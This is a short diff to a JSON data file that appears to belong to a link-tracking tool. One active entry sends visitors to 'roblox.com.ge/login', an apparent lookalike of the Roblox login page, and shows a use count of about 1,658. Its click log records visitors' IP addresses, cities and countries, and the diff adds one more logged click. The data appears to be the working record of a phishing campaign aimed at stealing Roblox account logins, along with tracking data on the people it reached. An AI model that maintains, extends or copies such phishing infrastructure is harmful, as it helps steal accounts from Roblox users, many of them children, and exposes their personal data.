@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1657,
+    "useCount": 1658,
     "createdBy": "admin",
     "clicks": [
       {
@@ -13422,6 +13422,14 @@
         "ip": "24.180.49.3",
         "country": "United States",
         "city": "Long Beach",
+        "flag": "🇺🇸",
+        "countryCode": "US"
+      },
+      {
+        "timestamp": 1777600872766,
+        "ip": "66.249.64.166",
+        "country": "United States",
+        "city": "Mountain View",
         "flag": "🇺🇸",
         "countryCode": "US"
       }
